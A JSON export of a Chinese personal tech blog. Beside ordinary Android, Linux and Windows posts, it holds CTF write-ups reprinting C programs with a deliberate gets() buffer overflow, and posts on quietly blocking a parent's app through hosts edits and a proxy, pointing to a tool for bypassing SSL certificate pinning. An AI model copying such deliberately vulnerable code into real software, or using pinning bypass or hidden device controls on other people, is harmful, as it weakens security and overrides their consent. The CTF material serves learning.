{"posts":[{"title":"2019picoCTF部分writeup","text":"一、写在前面的话七十周年，岿然屹立，海晏河清，国泰民安。继先烈之遗志，泓炎黄之气概。这盛世，定如您所愿！伟大的祖国母亲生日快乐！ 二、picoCTF介绍美国CMU主办，面向初高中生，难度偏简单，综合性强。唯一的缺点是我太菜了 三、部分题目wp1. like 1000 | Forensics一个似曾相识的层层嵌套压缩包，只不过我打包了100层，它打包了1000层。 最后里面有一个flag.png文件就是明文密码。 2. Flag | Crypto一个信号旗组成的密码，使用的是国际通用信号旗。 这里有一点需要注意，大括号 { 右面第二个字符由于无法直接对应，所以经过尝试确定为数字 1 手动感谢小白同学为我提供的思路支持 3. What Lies Within | Forensics一张图片，猜测是图片隐写。 用Stegsolve打开，选择选择Data Extract, 按如图所示勾选，注意flag是不包括里面出现的空格的 其他的可能会持续更新。。。","link":"/2019/10/01/2019picoCTF%E9%83%A8%E5%88%86writeup/"},{"title":"AccessibilityService测试","text":"onAccessibilyEvent()接收不到系统传来的event。","link":"/2020/09/17/AccessibilityService%E6%B5%8B%E8%AF%95/"},{"title":"Android底部导航栏实现","text":"总结一下安卓底部导航栏的实现流程。 导航栏效果图： 方法一：多层嵌套LinearLayout 放置一个横向的LinearLayout； 在里面依次放置若干纵向的LinearLayout； 再在里面放置一个ImageView和一个TextView，分别显示图片和文字说明。 这种方式的问题是当布局嵌套过多时，可能会产生性能问题，引起卡顿。 方法二：RadioGroup+RadioButton首先准备好适当尺寸的图片： 然后编写布局文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;!--最外层结构--&gt; &lt;FrameLayout android:id=&quot;@+id/fragment&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:layout_above=&quot;@+id/id_diverline&quot; /&gt; &lt;!--分割线--&gt; &lt;View android:id=&quot;@+id/id_diverline&quot; android:layout_above=&quot;@+id/id_bottom_tags&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;1dp&quot; android:background=&quot;#C2C5CE&quot;/&gt; &lt;!--内部结构--&gt; &lt;LinearLayout android:id=&quot;@+id/id_bottom_tags&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;55dp&quot; android:layout_alignParentBottom=&quot;true&quot; android:background=&quot;@drawable/bt_tag_bg&quot; android:orientation=&quot;horizontal&quot;&gt; &lt;!--互斥按钮组--&gt; &lt;RadioGroup android:id=&quot;@+id/radio_group&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:layout_gravity=&quot;center&quot; android:background=&quot;@color/transparent&quot; android:gravity=&quot;center&quot; android:orientation=&quot;horizontal&quot;&gt; &lt;!--需要多少个标签就写多少个RadioButton--&gt; &lt;RadioButton android:id=&quot;@+id/id_nav_message&quot; android:layout_width=&quot;0dp&quot; android:checked=&quot;true&quot; android:layout_height=&quot;wrap_content&quot; android:layout_gravity=&quot;center&quot; android:layout_weight=&quot;1&quot; android:background=&quot;@color/transparent&quot; android:button=&quot;@null&quot; android:clickable=&quot;true&quot; android:drawablePadding=&quot;2dp&quot; android:drawableTop=&quot;@drawable/nav_menu_message&quot; android:gravity=&quot;center&quot; android:onClick=&quot;switchView&quot; android:text=&quot;消息&quot; android:textColor=&quot;@drawable/nav_text_color&quot; android:textSize=&quot;10sp&quot; /&gt; &lt;RadioButton android:id=&quot;@+id/id_nav_personal&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_gravity=&quot;center&quot; android:layout_weight=&quot;1&quot; android:background=&quot;@color/transparent&quot; android:button=&quot;@null&quot; android:clickable=&quot;true&quot; android:drawablePadding=&quot;2dp&quot; android:drawableTop=&quot;@drawable/nav_menu_personal&quot; android:gravity=&quot;center&quot; android:onClick=&quot;switchView&quot; android:text=&quot;我的&quot; android:textColor=&quot;@drawable/nav_text_color&quot; android:textSize=&quot;10sp&quot; /&gt; &lt;/RadioGroup&gt; &lt;/LinearLayout&gt;&lt;/RelativeLayout&gt; 此处需要注意一下几点： android:background属性指定为自定义的透明背景； android:checked属性只在第一个标签上添加； android:button=&quot;@null&quot;貌似是去掉RadioButton原生按钮的（不太清楚）； android:onClick属性指定在点击时响应哪个方法； android:drawableTop属性指定为自定义的图片； android:textColor指定为需要的字体颜色； 以下为个人使用的颜色，仅供参考： 1234567891011&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;resources&gt; &lt;color name=&quot;colorPrimary&quot;&gt;#6200EE&lt;/color&gt; &lt;color name=&quot;colorPrimaryDark&quot;&gt;#3700B3&lt;/color&gt; &lt;color name=&quot;colorAccent&quot;&gt;#03DAC5&lt;/color&gt; &lt;color name=&quot;normal_btn_bg&quot;&gt;#4674FD&lt;/color&gt; &lt;color name=&quot;selected_btn_bg&quot;&gt;#0F46AF&lt;/color&gt; &lt;color name=&quot;transparent&quot;&gt;#50FFFFFF&lt;/color&gt; &lt;color name=&quot;not_selected&quot;&gt;#999999&lt;/color&gt; &lt;color name=&quot;selected&quot;&gt;#D075EA&lt;/color&gt;&lt;/resources&gt; 接下来实现switchView方法： 1234567891011121314private fun changeFragment(fragment: Fragment) { val fragmentManager: FragmentManager = supportFragmentManager //开启事务 val transaction: FragmentTransaction = fragmentManager.beginTransaction() transaction.replace(R.id.fragment, fragment) //transaction.addToBackStack(null)//是否使用返回栈 transaction.commit() } fun switchView(view: View){ when (view.id) { R.id.id_nav_message -&gt; changeFragment(MessageFragment()) R.id.id_nav_personal -&gt; changeFragment(PersonalFragment()) } } 然后自己再动态添加需要的Fragment就好了。","link":"/2020/09/24/Android%E5%BA%95%E9%83%A8%E5%AF%BC%E8%88%AA%E6%A0%8F%E5%AE%9E%E7%8E%B0/"},{"title":"BAN掉那个APP(三)——代理篇","text":"通过不断努力查找，这可能是迄今最接近可行解的方案（之一）…… 众所周知在一台Android设备没有root权限的情况下，是不可以随意修改只读目录/system/etc/下的hosts文件的……所以我转换一个思路，可以从网络代理方向下手，通过第三方app建立底层的V*N连接，接管系统所有的网络流量，这样在V*N的配置中就可以进行数据包的过滤。 Postern通过搜索引擎得到一款支持定制Hosts文件的代理app，postern。不得不说这款软件在国内十分小众，各大应用商店均无下载（也有可能存在V*N的关系被下架了）链接会放在文末。 安装并打开该app后，第一次会询问是否允许建立V*N连接，需要提前允许。 点击侧边栏，进入“配置Hosts文件”选项， 点击“添加Host-IP”，将以下键值对输入进去： Host IP cdn-qukan.1sapp.com 127.0.0.1 mediaconfig.qutoutiao.net 127.0.0.1 ddd.1sapp.com 127.0.0.1 api.1sapp.com 127.0.0.1 经过测试，大概只有先打开代理app，再打开受害者app，才会生效。 只是这样的话，通知栏会常驻一个钥匙图标，还是挺容易发现的。 Postern下载地址：https://apktrending.com/apk-android/app-tunnelworkshop-postern.html 有点儿深，得到文中找","link":"/2020/03/09/BAN%E6%8E%89%E9%82%A3%E4%B8%AAAPP(%E4%B8%89)%E2%80%94%E2%80%94%E4%BB%A3%E7%90%86%E7%AF%87/"},{"title":"BAN掉那个APP(二)——hosts篇","text":"书接上文：https://tjublesson.top/2020/02/01/%E5%B1%80%E5%9F%9F%E7%BD%91kali%E5%AE%9E%E9%AA%8C/ 今日随心情所喜好，再次选择使用路由器后台方式限制家父使用某app，未曾想在发现wifi无法正常使用app后，转而使用了流量……（话说使用流量我还怎么控制啊） 只好研究一种基于Android底层的流量控制方法了 修改hosts文件安卓系统基于linux内核，hosts文件位于/system/etc/中，默认情况下该目录处于只读权限。 实验中采用adb+模拟器的配置。 在模拟器中打开该app，此时是可以正常访问的。 以管理员权限运行cmd，依次输入： 123adb connect 127.0.0.1:7555adb rootadb remount 将原有host文件转移到主机中：adb pull /system/etc/hosts E:/apk-Decompile/ 此处最开始我选择了在windows下直接修改好后再转移到android上，但并不起效，查询资料可知，可能是windows的换行符与android中的并不通用所致，因此采取以下方法进行hosts的修改 adb shell //进入adb shell echo -e \\\\n &gt;&gt; /system/etc/hosts //新建一行 echo 127.0.0.1 mediaconfig.qutoutiao.net &gt;&gt; /system/etc/hosts echo 127.0.0.1 api.1sapp.com &gt;&gt; /system/etc/hosts echo 127.0.0.1 cdn.aiclk.com &gt;&gt; /system/etc/hosts echo 127.0.0.1 ddd.1sapp.com &gt;&gt; /system/etc/hosts echo 127.0.0.1 static.1sapp.com &gt;&gt; /system/etc/hosts 此时使用cat /system/etc/hosts查看是否修改成功 再次进入app并刷新，可以发现已经无法正常访问了 然而这种方式有局限，即必须获取到手机的root权限才可以操作，经过实验，在未root过的设备上进行adb root命令并不会起作用，所以该次实验仅做理论上的验证。 其实中老年人日常在家也并没有什么事可做，这种用来消磨时间还不搭钱的方式也无可厚非，毕竟，陪伴才是缓解无聊的良药。 2020-3-9更新：在模拟器抓包此app并分析其访问的url时曾遇到一个问题，即不开启抓包的情况下，app可以正常连接网络，但开启抓包后，app不能正常访问网络，且各项设置均正常。查阅相关资料后了解到，安卓app在进行https访问时，使用自签名证书+SSL Pinning的方式进行服务器身份验证，而抓包软件的开启使得证书校验失败，无法获取服务器返回信息。 解决方案：在已取得root权限的情况下，安装Xposed框架+JustTrustMe组件，该组件会将apk中所有用于校验SSL证书的API进行hook，从而绕过证书检查。 参考资料：https://m.imooc.com/article/251500?from=singlemessage Xposed官方安装地址：https://repo.xposed.info/module/de.robv.android.xposed.installer JustTrustMe Github地址：https://github.com/Fuzion24/JustTrustMe/releases/tag/v.2 （完）","link":"/2020/03/08/BAN%E6%8E%89%E9%82%A3%E4%B8%AAAPP(%E4%BA%8C)%E2%80%94%E2%80%94hosts%E7%AF%87/"},{"title":"CTF系列——Misc之PNG的CRC32校验","text":"参考资料：https://wiki.x10sec.org/misc/picture/png/ 题目是一张名为crc.png的PNG图片，在windows下并不能正常打开，怀疑是该PNG的宽度、高度被修改，导致CRC校验未通过。 使用010Editor打开该图片，看到如下信息： 前八个字节89 50 4E 47 0D 0A 1A 0A是PNG格式固定的文件头； 00 00 00 0D代表图片长宽的数据块长度为13，也是固定值； 第一个方框中49 48 44 52代表IHDR，固定值； 第二行开始的00 00 01 00为图片宽度，00 00 00 00为图片高度； 由于数据块长度为13，所以08 02 00 00 00为剩余部分； 12 9C B6 9B为CRC32校验和。 正常情况下，windows系统的图片查看器是可以忽略CRC校验失败而直接打开图片的，但由于这张图片的高度是0，所以，，无论如何也不能正常打开。而Linux下不可以直接打开CRC校验失败的图片。 先将高度改为01 00试试： 这辣眼睛的色彩。。。看起来是不对的 参考网络上的相关资料，需要考虑爆破CRC校验，所以上python 版本一1234567891011121314151617import binasciiimport struct# \\x49\\x48\\x44\\x52\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x08\\x02\\x00\\x00\\x00crc32key = 0x129CB69Bfor i in range(0, 65535): for j in range(0, 65535): width = struct.pack('&gt;i', j) height = struct.pack('&gt;i', i) data = b'\\x49\\x48\\x44\\x52' + width + height + b'\\x08\\x02\\x00\\x00\\x00' crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print(''.join(map(lambda c: &quot;%02X&quot; % c, width))) print(''.join(map(lambda c: &quot;%02X&quot; % c, height))) 该版本在python 3.8运行通过。 得到答案如下： 将图片的宽度和高度修改为以上结果，可以还原初始图片 版本二该代码来源于CTFwiki官方： 123456789101112import osimport binasciiimport structmisc = open(&quot;此处选择图片&quot;,&quot;rb&quot;).read()for i in range(1024): data = misc[12:16] + struct.pack('&gt;i',i)+ misc[20:29] crc32 = binascii.crc32(data) &amp; 0xffffffff if crc32 == &quot;此处填写CRC校验和&quot;: print i 声明：该代码未经测试，且对于此题需要同时爆破高度和宽度，这里只给出一个维度的循环，需仿照上面的代码进行修改。（嘛，懒得再测试一遍了，反正结果一样~ 总结：以前的CRC经常是给出宽度或者高度，另一个值需要自己破解，但是这次居然同时需要两个值，算是一个小坑吧（我太菜了，逃 特别鸣谢：手动@谢大佬","link":"/2020/03/13/CTF%E2%80%94%E2%80%94Misc%E4%B9%8BPNG%E7%9A%84CRC32%E6%A0%A1%E9%AA%8C/"},{"title":"CTF之pwn入门体验","text":"一入pwn坑深似海，从此头发是路人，，， 一、前言考虑到协会发展需要，在新生代成员中得至少有一个搞pwn的队员，这样在比赛中才能不吃二进制的亏，，，作为负责人怎么能不担此重任（滑稽 这次的三道题都是超级简单的入门题目，前两道是pwn，最后一道是reverse，权当长见识了。 二、题目1.buffOverflow#01234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;signal.h&gt;void win(){ printf(&quot;You win!\\n&quot;); char buf[256]; FILE* f = fopen(&quot;./flag.txt&quot;, &quot;r&quot;); if (f == NULL) { puts(&quot;flag.txt not found - ping us on discord if this is happening on the shell server\\n&quot;); } else { fgets(buf, sizeof(buf), f); printf(&quot;flag: %s\\n&quot;, buf); }}void vuln(){ char buf[16]; printf(&quot;Type something&gt;&quot;); gets(buf); printf(&quot;You typed %s!\\n&quot;, buf);}int main(){ /* Disable buffering on stdout */ setvbuf(stdout, NULL, _IONBF, 0); /* Call win() on SIGSEGV */ signal(SIGSEGV, win); vuln(); return 0;} 典型的缓冲区溢出可以看到main函数中首先调用了 signal(SIGSEGV, win); 接下来运行的 vuln() 用来读取并储存输入的字符串，所以一旦程序产生segmentation fault(段错误)，就会被signal信号捕获，进而执行 win() 函数，也就是读取flag文件。 所以用某殷姓学长的话来说，这个程序，进去瞎jb敲一堆字符串就好了 φ(≧ω≦*)♪ 此处显示flag.txt not found是因为程序在本地测试，真正题目环境需要nc ip 端口进行连接，就可以正常读取flag.txt了。 2.bufOverflow#212345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;void win(){ printf(&quot;You win!\\n&quot;); char buf[256]; FILE* f = fopen(&quot;./flag.txt&quot;, &quot;r&quot;); if (f == NULL) { puts(&quot;flag.txt not found - ping us on discord if this is happening on the shell server\\n&quot;); } else { fgets(buf, sizeof(buf), f); printf(&quot;flag: %s\\n&quot;, buf); }}void vuln(){ char buf[16]; printf(&quot;Type something&gt;&quot;); gets(buf); printf(&quot;You typed %s!\\n&quot;, buf);}int main(){ /* Disable buffering on stdout */ setvbuf(stdout, NULL, _IONBF, 0); vuln(); return 0;//$eip=0x80491b2} 还是缓冲区溢出仍然是从代码中可以看出，这道题与上一道题的区别在于，main函数里没有了signal()函数进行段错误信号捕获，只好通过某种技术手段跳转到win()函数执行。 打开IDA，查看win()函数的地址： 嗯，，，就是c代码中 return 0; 处注释的地址，，，所以我的目的很明显，就是运行到 return 0; 时中断，修改$eip寄存器的值为win()函数的地址，这样就成功把程序引入win()函数。 此处插入函数运行基础知识： 在介绍如何实现溢出攻击之前，让我们先简单温习一下函数调用栈的相关知识。函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。 Fig 2. 函数调用发生和结束时调用栈的变化函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。 不想copy了直接贴原文章吧https://paper.seebug.org/271/ 总之先打开pwndbg调试着： 然而以上只是我验证自己猜想的过程，这时候只好求助于学长~ （鉴于我并没有搞懂函数栈帧结构，payload这部分以后再填） 3.parrot(reverse)这是平台上的一道逆向题，IDA打开 值得注意的是，这里有一个硬编码近函数的字符串 12.data:0804A041 00000032 C jctf{my_b3l0v3d_5qu4wk3r_w0n7_y0u_l34v3_m3_4l0n3} 这里是第一个坑，千万别一激动直接就提交了Orz 再来左侧函数窗口选中main，F5反编译 还是输入字符串并进行判断的程序，通过分析可知该程序的判断逻辑 判断输入字符串长度是否等于34，否则直接退出； 判断第0~5位是否为 tjctf{ 判断第6~8位是否为 3d_ 判断第10~33位是否为 0n7_y0u_l34v3_m3_4l0n3} 最后检查第9位是否为 d 说明： 由于程序硬编码的字符串是jctf{开头，而不是tjctf{，这时就要注意到 0x804A040 这个地址： 这就解释了第一个字符t是哪里来的 第5步中提到检查第9位是否为字符’d’，是因为在最开始的变量声明中，v8被声明为char类型，在此处被和100比较，而ASCII=100的字符恰好是’d’。 综上，我们就可以拼出一份完整的flag： 1tjctf{3d_d0n7_y0u_l34v3_m3_4l0n3} （don’t you leave me alone吗？） 三、总结这两个个pwn和一个reverse仅仅是最基础最入门的内容，要想达到丁佬殷佬的高度还远着呢~ o( =•ω•= )m ━━(￣ー￣*|||━━ 0:13，睡觉，养生，论当代大学生的个人生活","link":"/2019/09/27/CTF%E4%B9%8Bpwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/"},{"title":"Linux多线程编程计算pi值","text":"操作系统原理课程LAB2使用pthread系列函数进行多线程编程计算pi的近似值。 一、实验原理1. 计算公式 2. pthread.h 包含pthread系列函数的头文件 pthread_create() 函数原型： 1int pthread_create(pthread_t * thread, const pthread_arrt_t* attr,void*(*start_routine)(void *), void* arg); 各参数含义：(1) thread是线程标识符，类型为int；(2) attr用于设置线程属性，如果为NULL则表示为默认属性；(3) start_routine和arg表示新线程运行的函数和参数；(4) 该函数返回值：成功返回0，失败返回错误号。 pthread_join() 函数原型： 1void pthread_join(pthread_t thread,void ** retval); 各参数含义：(1) thread为新线程的标识符；(2) retval有如下情况： 如果thread线程通过return返回,value_ptr所指向的单元里存放的是thread线程函数的返回值。 如果thread线程被别的线程调用pthread_cancel异常终掉,value_ptr所指向的单元里存放的是常数PTHREAD_CANCELED。 如果thread线程是自己调用pthread_exit终止的,value_ptr所指向的单元存放的是传给pthread_exit的参数。 如果对thread线程的终止状态不感兴趣,可以传NULL给value_ptr参数。 函数功能：调用该函数的线程将被挂起等待，直到标识符为thread的线程结束运行。 pthread_exit() 函数原型：1void pthread_exit(void * retval); 各参数含义：（1）retval是void *类型,其它线程可以调用pthread_join获得这个指针。需要注意,pthread_exit或者return返回的指针所指向的内存单元必须是全局的或者是由malloc分 配的,不能在线程函数的栈上分配,因为当其它线程得到这个返回指针时线程函数已经退出了。（2）pthread_exit函数通过retval参数向线程的回收者传递其退出信息。它执行之后不会返回到调用者，且永远不会失败。 3. 计算过程与线程互斥操作假设线程数量为t，则可将上述公式中的N平均分为t份，每份交给一个线程运行，最后再将计算得到的结果进行累加，在这里需要注意，累加的过程中涉及到了对同一变量的修改，出现临界区的问题，需要加锁进行解决，可使用pthread_mutex_lock(&amp;lock) 和 *pthread_mutex_unlock(&amp;lock)*。 4. 编译命令示例1gcc test.c –o test –lpthread 二、代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;time.h&gt;int N,t;//声明全局变量double *pret;//指向计算结果的指针double ret;//每个线程的返回值pthread_mutex_t lock;//锁变量double total_time[12];//存放程序运行时间//此处是为了存放下面注释掉的12组对比实验结果void* thread(void *ID);double multiThread(int t, int N, double *p_time);int main(){ printf(&quot;input N: &quot;); scanf(&quot;%d&quot;, &amp;N); printf(&quot;input t: &quot;); scanf(&quot;%d&quot;, &amp;t); double res = multiThread(t, N, &amp;total_time[0]); printf(&quot;t=%d, N=%d, pi=%.15lf, total_time=%lf\\n&quot;, t, N, res, total_time[0]); //以下代码分别测试线程数为2，4，6，8， //计算量分别为100000，1000000，10000000时的结果和运行时间。 /*for(t = 2; t &lt;= 8; t += 2){ N = 100000; double res = multiThread(t, N, &amp;total_time[(t/2)-1]); printf(&quot;t=%d, N=%d, pi=%.15lf, total_time=%lf\\n&quot;, t, N, res, total_time[(t/2)-1]); } printf(&quot;\\n&quot;); for(t = 2; t &lt;= 8; t += 2){ N = 1000000; double res = multiThread(t, N, &amp;total_time[(t/2)-1]); printf(&quot;t=%d, N=%d, pi=%.15lf, total_time=%lf\\n&quot;, t, N, res, total_time[(t/2)-1]); } printf(&quot;\\n&quot;); for(t = 2; t &lt;= 8; t += 2){ N = 10000000; double res = multiThread(t, N, &amp;total_time[(t/2)-1]); printf(&quot;t=%d, N=%d, pi=%.15lf, total_time=%lf\\n&quot;, t, N, res, total_time[(t/2)-1]); } printf(&quot;\\n&quot;);*/ return 0;}double multiThread(int t, int N, double *p_time){ int check_create;//检查线程是否成功创建 int check_exit;//检查线程是否成功退出 double sum = 0.0; clock_t start, finish;//程序运行的起止时间 //double total_time = 0.0; pthread_t *threads;//线程标识数组 void** threads_ret;//存放每个线程返回结果的数组 threads = (pthread_t*)malloc(sizeof(pthread_t)*(t+1));//为每一个数组分配内存空间 threads_ret = (void*)malloc(sizeof(void*)*(t+1)); start = clock();//开始计时 for(int i = 0; i &lt; t; i++){ check_create = pthread_create(&amp;threads[i], NULL, thread, (void*)&amp;i);//循环创建线程 if(check_create != 0){ printf(&quot;Thread creates failed\\n&quot;); exit(1); } check_exit = pthread_join(threads[i], &amp;threads_ret[i]);//等待线程结束并携带计算结果返回 if(check_exit != 0){ printf(&quot;Thread exit failed\\n&quot;); exit(1); } pthread_mutex_lock(&amp;lock);//执行累加操作前上锁 sum += (*(double*)threads_ret[i]); pthread_mutex_unlock(&amp;lock);//解锁 } finish = clock(); *p_time = (double)(finish - start) / CLOCKS_PER_SEC;//计算总时间，单位ms return sum;}void *thread(void *ID){ int id = *(int*)ID;//使用ID判断当前线程计算哪一组 ret = 0.0;//初始化结果 for(int i = (N/t)*id; i &lt; (N/t)*(id+1); i++){ double tmp = (4 / (1+ ((i+0.5)/N)*((i+0.5)/N))) * (1.0/N); ret += tmp; } pret = &amp;ret; pthread_exit((void*)pret);//退出线程并返回计算结果 }","link":"/2019/10/28/Linux%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B%E8%AE%A1%E7%AE%97pi%E5%80%BC/"},{"title":"PowerShell在文件内查找字符串","text":"命令11Get-ChildItem -Path .\\ -Recurse | Select-String -Pattern 'Hello' -List | Select Path Get-ChildItem：获取特定目录及其子项；-Recurse递归所有文件、目录、子目录 Select-String：在指定文件中查找字符串 命令21ls -r -Path C:\\pc | sls 'Hello' | select -u Path ls：类似于Linux系统命令，使用-r参数列举指定位置的目录及子目录 sls：是上一个命令里Select-String的别名 总结Powershell在功能性上非常丰富且优雅，嗯。","link":"/2022/09/15/PowerShell%E5%9C%A8%E6%96%87%E4%BB%B6%E5%86%85%E6%9F%A5%E6%89%BE%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"title":"Traceroute实验","text":"前言：此文章整理于java上机课上，（由于课程安排太满）好惨一大学生在线挤时间做笔记 一、实验背景专业课 计算机网络 一次路由追踪实验 二、实验原理windows10(64位) cmd tracert命令 123456789101112用法: tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] [-R] [-S srcaddr] [-4] [-6] target_name选项: -d 不将地址解析成主机名。 -h maximum_hops 搜索目标的最大跃点数。 -j host-list 与主机列表一起的松散源路由(仅适用于 IPv4)。 -w timeout 等待每个回复的超时时间(以毫秒为单位)。 -R 跟踪往返行程路径(仅适用于 IPv6)。 -S srcaddr 要使用的源地址(仅适用于 IPv6)。 -4 强制使用 IPv4。 -6 强制使用 IPv6。 三、实验操作1.准备脚本由于该实验要求每隔一小时进行一次traceroute实验，共进行三次，所以这种重复性机械操作当然是交给我亲爱的python来完成了~ （其实time.sleep(3600)才是最sao的） 就这样挂在后台跑吧，我先去睡觉，，， 2.处理数据当我醒来，打开熟悉的txt，看到满屏幕的实验数据，内心无比激动，，， 每个ip地址对应的实际地址已经在图片上了，其中第二三四列分别代表主机发出的三个独立的数据包产生的延迟。 本次实验特地选择了两个代表国内和国外的urltjublesson.top &amp; www.jd.com （真的不是在给京东打广告，我也尝试过淘宝，只不过最后被传输到了郑州大学的服务器，咱也不知道） 然后我又尝试了一下某“不存在的网站”： 好嘛，原来是直接ip阻断了啊，，， 3.实验结论本次实验内容很简单，是作为对网络结构整体理解的一次辅助，可以看到在同级ip网段的连接处会产生较大的延迟，说明跨ISP的延迟相对更大。","link":"/2019/09/22/Traceroute%E5%AE%9E%E9%AA%8C/"},{"title":"mumu模拟器启动时系统蓝屏解决","text":"本文关键词：WSL2，Hyper-V，安卓模拟器 事件起因听说WSL（Windows Subsystem for Linux）以及升级版WSL2是最好的Linux发行版（误），遂搞一搞体验一下。按照教程打开控制面板-程序和功能-添加或删除Windows功能-适用于Linux的Windows子系统，重启电脑，在Microsoft Store下载Ubuntu 20.04 LTS，等待片刻就可以使用了。 接下来是升级WSL2，由于相比于WSL，WSL2在内核层面进行了全新的升级，两者之间差异巨大。 升级官方教程： https://docs.microsoft.com/zh-cn/windows/wsl/install-win10 晚上打开Mumu模拟器想来一把手游，结果尝试多次后发现，启动加载到42%系统必蓝屏崩溃…… ヽ(｀Д´)ﾉ︵ ┻━┻ ┻━┻ 坑爹呢这是！ 解决过程尝试删除Ubuntu20.04并关闭适用于Linux的Windows子系统后并没有效果，然后安装另一款模拟器蓝叠，在打开时提示请关闭Hyper-V，遂将问题定位到Hyper-V与模拟器的兼容性上。 打开系统管理-服务，发现所有Hyper-V相关服务都是关闭状态，所以我陷入了沉思…… 多方搜索资料后，找到以下解决方案： 以管理员模式运行CMD，依次输入： 12bcdedit /copy {current} /d “Windows10 no Hyper-V”bcdedit /set {上一条命令得到的序列号} hypervisorlaunchtype OFF 此时重启计算机，会发现启动时有两个选项，Windows 10和Windows10 no Hyper-V，选择第二个，进入系统，再次以管理员模式运行CMD，输入以下命令： 1234bcdedit #查看当前启动管理器配置列表bcdedit /set description &quot;Windows 10&quot; #将当前启动配置项的描述改为Windows 10bcdedit /delete {default} #删除原来的default配置bcdedit /default {current} #将当前配置设置为default 此时再使用bcdedit命令查看启动管理列表，发现当前控制项最后一行的hypervisorlaunchtyper为off，说明成功了，再打开mumu模拟器也不会崩溃，打开蓝叠也不会提示关闭Hyper-V了。 题外话强推Windows Terminal，美观大气高颜值，可自定义外观字体和背景亚克力效果，中文渲染不会乱码，支持linux命令在windows下的使用，高效整合CMD，PowerShell，Git Bash等多种终端，赶紧到Microsoft Store体验一下吧！","link":"/2020/09/29/mumu%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%90%AF%E5%8A%A8%E6%97%B6%E7%B3%BB%E7%BB%9F%E8%93%9D%E5%B1%8F%E8%A7%A3%E5%86%B3/"},{"title":"Ubuntu+gemu+xv6搭建计算机原理实验平台","text":"更新于2019-09-16：修复了无法成功在虚拟机中加载的bug 背景：必修课 操作系统原理一、 准备工具：VMware Workstation 15 Player Ubuntu 18.04 QEMU虚拟机 Xv6实验平台 QEMU（quick emulator）是一款由Fabrice Bellard等人编写的免费的可执行硬件虚拟化的（hardware virtualization）开源托管虚拟机（VMM）。 来源：百度百科 Xv6是由麻省理工学院(MIT)为操作系统工程的课程（代号6.828）,开发的一个教学目的的操作系统。Xv6是在x86处理器上(x即指x86)用ANSI标准C重新实现的Unix第六版(Unix V6，通常直接被称为V6) 。 来源：维基百科 二、实验原理在Windows环境中利用VMware虚拟机安装Ubuntu平台，并在Ubuntu上利用QEMU虚拟机安装今天的主角Xv6。 （大概类似俄罗斯套娃的结构吧） 三、实验步骤1.安装VMware Workstation 15 Player这个教程就不写了，本专业的应该都会吧，（大概） 2.在VMware上安装Ubuntu 18.04这个教程随便谷歌一大堆，就不写了吧。 3.在Ubuntu里安装QEMU安装QEMU的方法有很多，可以git clone源码然后自己编译，也可以采用apt-get安装，代码如下： 1sudo apt-get install qemu 安装之后打开终端测试安装是否成功，输入： 1qemu-system-i386 注：如果安装的简化版Ubuntu没有git、vim的话，使用以下命令安装： 12sudo apt-get install gitsudo apt-get install vim 4.克隆Xv6源码，编译并安装使用以下命令clone一份Xv6源代码： 1git clone https://github.com/mit-pdos/xv6-public.git cd进入Xv6源代码的目录，在终端中使用make命令编译 注：1. 此时可能会遇到没有安装gcc的情况，使用 12sudo apt-get updatesudo apt-get install gcc 安装gcc，之后就可以编译了。 如果仍然报编译错误， lib/printfmt.c:42：对‘__udivdi3’未定义的引用 lib/printfmt.c:50：对‘__umoddi3’未定义的引用 原因：由于在printfmt.c文件中用了libgcc.a中的库函数，但是我的开发环境是64位的gcc，所以找不到这个库文件。 解决： 12sudo apt-get install gcc-multilibsudo apt-get install ia32-libs lib32gcc1 lib32stdc++6 所有步骤完成后，在终端输入make qemu就可以正常启动了 四、结尾经过一晚上的折腾，总算是成功安装了QEMU和Xv6，但是我遇到了如下问题： QEMU始终卡在Booting from hard disk…语句，并不断闪烁，希望能找到解决办法。 2019-09-16 重新clone了一份Xv6的源代码，再次make编译，然后在根目录使用make qemu，这次就成功了（果然重装解决99.9%的问题） 